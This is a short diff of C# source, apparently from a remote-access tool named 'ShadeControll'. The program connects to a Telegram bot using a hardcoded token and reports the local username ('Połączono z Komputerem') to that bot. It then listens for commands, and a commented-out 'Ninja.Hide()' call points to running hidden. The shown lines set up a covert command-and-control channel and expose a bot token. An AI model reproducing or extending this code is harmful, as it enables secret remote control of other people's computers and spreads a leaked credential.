@@ -10,9 +10,12 @@ namespace ShadeControll
         public static TelegramClient Client;
         static void Main()
         {
+            
             //Ninja.Hide();
+
             Client = new TelegramClient("1774037430:AAHnjjeOUNvn-ZpyCCo_6mIhztp_GkagsVg");
             while(!Client.Connect()) { Thread.Sleep(1000); }
+            Client.SendMessage("start wersja checkk");
             Client.SendMessage("Połączono z Komputerem - " + Environment.UserName + "\n /help");
             Client.NewMessage += Client_NewMessage;
             while (true) { Thread.Sleep(1000); }
